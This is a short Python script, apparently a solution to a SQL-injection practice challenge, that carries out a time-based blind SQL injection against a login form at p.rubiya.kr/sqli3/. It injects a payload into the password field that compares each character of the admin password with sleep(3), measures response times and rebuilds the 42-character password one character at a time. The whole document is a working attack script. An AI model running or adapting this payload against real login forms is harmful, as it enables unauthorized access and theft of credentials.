import requests
import string
import time

pw_len = 42
password = ''
list = list(string.printable)
for i in range(1, pw_len+1):
    for asc in range(33, 127):
        url = 'https://p.rubiya.kr/sqli3/'
        data = {
            'id': 'admin',
            'pw': '\' or ord(substr(pw,'+str(i)+',1))='+str(asc)+' and sleep(3) -- -'
        }
        start = time.time()
        res = requests.post(url, data=data)
        print(data)
        if time.time() - start > 2:
            password += chr(asc)
            print("password >>>",password)
            break
print(password)